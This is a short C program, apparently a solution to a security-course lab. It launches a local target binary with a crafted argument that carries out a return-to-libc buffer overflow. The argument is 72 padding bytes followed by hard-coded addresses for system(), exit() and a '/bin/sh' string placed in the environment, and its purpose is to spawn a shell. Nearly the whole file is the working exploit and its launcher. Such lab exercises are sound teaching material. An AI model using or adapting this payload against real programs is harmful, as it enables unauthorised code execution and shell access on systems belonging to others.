#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char prog[] = "../targets/target3";
// 64 + 8 = 72 A's, dummy EBP, addr of system(), addr of exit(), addr of /bin/sh
// ret addr for system must be == 2 otherwise the loop on argc will fail
char attack[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x38\xfe\xff\xbf\x7c\xd9\x05\x40\xff\xff\xff\xff\xe1\xff\xff\xbf";

int main(int argc, char **argv) {
    char *newargv[] = { prog, attack, NULL };

    // Adding /bin/sh to environment so we can use it in the attack.
    char *envp[] = { "SHELL=/bin/sh", NULL };

    if (execve(prog, newargv, envp) == -1) {
        perror("execve failed");
	return 1;
    }
    
    return 0;
}
